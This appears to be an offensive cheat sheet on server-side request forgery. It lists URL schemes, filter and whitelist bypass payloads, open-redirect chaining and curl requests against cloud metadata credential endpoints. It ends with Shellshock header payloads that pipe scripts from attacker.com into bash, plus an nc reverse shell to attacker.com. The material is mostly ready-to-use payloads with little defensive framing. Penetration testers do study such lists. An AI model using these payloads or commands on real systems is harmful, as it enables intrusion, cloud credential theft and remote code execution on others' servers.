
https://github.com/lutfumertceylan/top25-parameter/blob/master/ssrf-parameters.txt

- `http://` – Standard web traffic (HTTP).
- `https://` – Secure web traffic (HTTPS).
- `ftp://` – File Transfer Protocol.
- `file://` – Access local files on the server.
- `gopher://` – Deprecated protocol; useful for raw TCP payloads.
- `dict://` – Dictionary service protocol (can trigger commands).
- `ldap://` – Lightweight Directory Access Protocol.
- `ldaps://` – Secure LDAP.
- `smb://` – Server Message Block protocol (for file shares).
- `nfs://` – Network File System protocol.
- `tftp://` – Trivial File Transfer Protocol.
- `scp://` – Secure Copy Protocol.
- `sftp://` – Secure File Transfer Protocol.
- `mailto:` – Send emails.
- `telnet://` – Remote command-line connections.
- `ssh://` – Secure Shell protocol.
- `data:` – Inline data (e.g., base64 encoded payloads).
- `javascript:` – JavaScript execution (if supported).
- `about:` – Internal browser schemes (e.g., `about:blank`).
- `chrome://` – Chromium-specific internal schemes.
- `mysql://` – Connect to MySQL databases.
- `postgres://` – Connect to PostgreSQL databases.
- `redis://` – Interact with Redis instances.
- `memcached://` – Interact with Memcached servers.
- `mongodb://` – MongoDB database access.
- `couchdb://` – CouchDB database access.
- `svn://` – Subversion protocol.
- `git://` – Git version control protocol.
- `vnc://` – Virtual Network Computing connections.
- `ws://` – WebSocket protocol.
- `wss://` – Secure WebSocket protocol.
- `jdbc://` – Java Database Connectivity.
- `rmi://` – Remote Method Invocation protocol.
- `nntp://` – Network News Transfer Protocol.
- `imap://` – Internet Message Access Protocol.
- `pop3://` – Post Office Protocol.
- `smtp://` – Simple Mail Transfer Protocol.
- `sip://` – Session Initiation Protocol (VoIP).
- `rtsp://` – Real-Time Streaming Protocol.
- `magnet:` – Magnet links (e.g., for torrents).

for example:
```bash
stockApi=file://127.0.0.1/etc/passwd
stockApi=ftp://127.0.0.1/admin
```

```bash
stockApi=http://2130706433/admin
stockApi=http://0x7F000001:8080/admin
```


1. Register a domain (e.g., `myspoofeddomain.com`).
2. Use a DNS service (e.g., Cloudflare or AWS Route53) to create an A record pointing to `127.0.0.1`.
3. Use the domain in your payload.

**Payload Example**:
```bash
tockApi=http://myspoofeddomain.com/admin
```


Obfuscate Blocked Strings
```bash
stockApi=http://%31%32%37%2E%30%2E%30%2E%31/admin
```

Case variation:
```bash
LocalHost, LOCALHOST, lOcAlHoSt
```

### **Leverage DNS Pinning**
Some systems resolve domains once and then reuse the IP for subsequent requests. You can exploit this to bypass filters:
**Steps**:

1. Register a domain and initially resolve it to a benign IP.
2. Change the DNS resolution to `127.0.0.1` after the server has cached the original lookup.

### **Exploit URL Parsing Quirks**
Some filters improperly parse URLs, which can be exploited to bypass blacklists.
```bash
http://127.0.0.1@mydomain.com  # Treated as "mydomain.com" by some filters
http:///127.0.0.1/admin
http://[::1]/admin
http://%252e%252e/127.0.0.1/admin  # Double encoding

- `[::]` (IPv6 wildcard address for all interfaces).
- `0.0.0.0` (IPv4 wildcard address for all interfaces).
- `127.1`, `127.0.1.1`
```


| **Technique** | **Example** |
| --- | --- |
| Alternative IP Representation | `2130706433`, `017700000001`, `0x7F000001` |
| Custom Domain | `http://spoofed.example.com` |
| URL Encoding | `%31%32%37%2E%30%2E%30%2E%31` |
| Case Variation | `LocalHost`, `LOCALHOST` |
| Redirection | `http://redirect.example.com/admin` |
| Protocol Switching | `https://127.0.0.1`, `file://127.0.0.1` |
| Exploit URL Parsing | `http://127.0.0.1@spoof.com` |
| IPv6 Loopback | `http://[::1]/admin` |
SSRF with whitelist-based input filters

1.Embed Credentials in the url
```bash
https://allowed.com:password@malicious.com
```
- Whitelist check matches `allowed.com`.
- Backend request is sent to `malicious.com`.

```bash
https://allowed.com:8080@malicious.com
```

2. Use the Fragment Identifier (#)
```bash
https://malicious.com#allowed.com
https://malicious.com#@allowed.com
- Whitelist matches `allowed.com` after `#`.
- Backend sends the request to `malicious.com`.
```

3. Exploit DNS Naming Hierarchy
```bash
https://allowed.com.malicious.com
- Behavior:
    - Whitelist matches `allowed.com`.
    - Backend resolves to `malicious.com`.
      
https://allowed.com.malicious.com:8080
https://allowed.com.malicious.com#extra

```

4. URL Encoding and Double Encoding
```bash
https://%61llowed.com.malicious.com
https://%2561llowed.com.malicious.com
https://xn--allowed.com.malicious.com

```

5. Combine Multiple Techniques
```bash
https://allowed.com:password@malicious.com#fragment

- Behavior:
    - Whitelist validates `allowed.com`.
    - Backend sends request to `malicious.com`.

```


| **Technique** | **Payload Example** |
| --- | --- |
| Credentials | `https://allowed.com:password@malicious.com` |
| Fragment Identifier | `https://malicious.com#allowed.com` |
| DNS Naming Hierarchy | `https://allowed.com.malicious.com` |
| URL Encoding | `https://%61llowed.com.malicious.com` |
| Alternative IP Representations | `https://2130706433` |
| Path Parsing | `https://allowed.com/malicious.com` |
| Redirect Chains | `https://redirector.com` |
| Protocol-Specific | `ftp://malicious.com` |
| Subdomain Wildcards | `https://malicious.allowed.com` |
| Trailing Dots | `https://allowed.com.` |
| CRLF Injection | `https://allowed.com%0d%0aHost:malicious.com` |

### Pro Tip: **Fuzz with Automation**

- Use tools like **Burp Suite Intruder** or **ffuf** to automate payload testing.
- Combine these techniques dynamically to discover unique bypasses.


Bypassing SSRF Filters via Open Redirection:
Using open redirection vulnerabilities in a web application, you can bypass SSRF filters by redirecting traffic to your desired target. This is effective when the SSRF filter allows a whitelisted domain but does not handle redirections properly.

1. **Identify an Open Redirection Vulnerability**

- Look for a URL parameter in the target application that allows redirects, such as:
    
    ```bash
    
    https://whitelisted.com/redirect?url=https://malicious.com
    ```
    
- Verify the vulnerability:
    - Replace the `url` parameter with your controlled domain (`https://malicious.com`).
    - If the application redirects to `https://malicious.com`, the open redirect is exploitable.

2. **Craft the SSRF Payload**

- Use the open redirect URL in the vulnerable parameter to redirect SSRF traffic to your target.
- Example:
    
    ```bash
    stockApi=https://whitelisted.com/redirect?url=http://127.0.0.1:80/admin
    ```
    

3. **Send the Payload**

- Inject the crafted payload into the SSRF parameter of the application.
- The application:
    1. Passes the SSRF filter because the base domain (`whitelisted.com`) is valid.
    2. Follows the redirect and sends the request to the target (e.g., `127.0.0.1`).

4. **Verify the Result**

- Monitor the response or behavior to confirm the request reached the redirected target.

---

**Example Payloads**

Basic Payload:

```bash
stockApi=https://whitelisted.com/redirect?url=http://127.0.0.1/admin
```

Payload with URL Encoding:

```perl

stockApi=https://whitelisted.com/redirect?url=http%3A%2F%2F127.0.0.1%2Fadmin

```

Advanced Redirects:

- Redirect to another open redirect endpoint:
```bash
stockApi=https://whitelisted.com/redirect?url=https://trusted.com/redirect?url=http://12

```



1. **Trust in Referer**: The application processes the `Referer` header by fetching its URL, assuming it is a safe, legitimate source.
2. **Manipulation**: An attacker controls the `Referer` header and injects a malicious URL that points to internal resources (e.g., `http://127.0.0.1/admin`).
3. **Exploitation**: The server performs the HTTP request defined in the manipulated `Referer`, allowing the attacker to:
    - Access internal resources (e.g., `http://127.0.0.1/`).
    - Exfiltrate sensitive data to an external server controlled by the attacker.


```bash
# Look for common SSRF-prone parameters in URLs

cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Look for API/webhook integrations or cloud metadata patterns
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Nuclei for automated scanning
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
# Basic SSRF to local services
curl "https://target.com/page?url=http://127.0.0.1:80/"
curl "https://target.com/page?url=http://localhost:8080"

# Target internal cloud metadata
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Bypass filters with alternative IP formats
http://127.0.0.1%23.google.com
http://127.1
http://[::1]/ 
http://0x7f000001
http://017700000001

# DNS rebinding or callback for blind SSRF
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
```


```bash
1. **Referer Header**:
    
    ```jsx
    
    Referer: () { :; }; /bin/bash -c 'curl http://attacker.com/reverse_shell.sh | bash'
    
    ```
    
2. **Cookie Header**:
    
    ```jsx
    Cookie: () { :; }; /bin/bash -c 'curl http://attacker.com/exploit.sh | bash'
    ```
    
3. **X-Forwarded-For Header**:
    
    ```jsx
    X-Forwarded-For: () { :; }; /bin/bash -c 'wget http://attacker.com/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh'
    
    ```
    
4. **Custom Header**:
   X-Custom-Header: () { :; }; /bin/bash -c 'nc -e /bin/bash attacker.com 4444'
```




https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4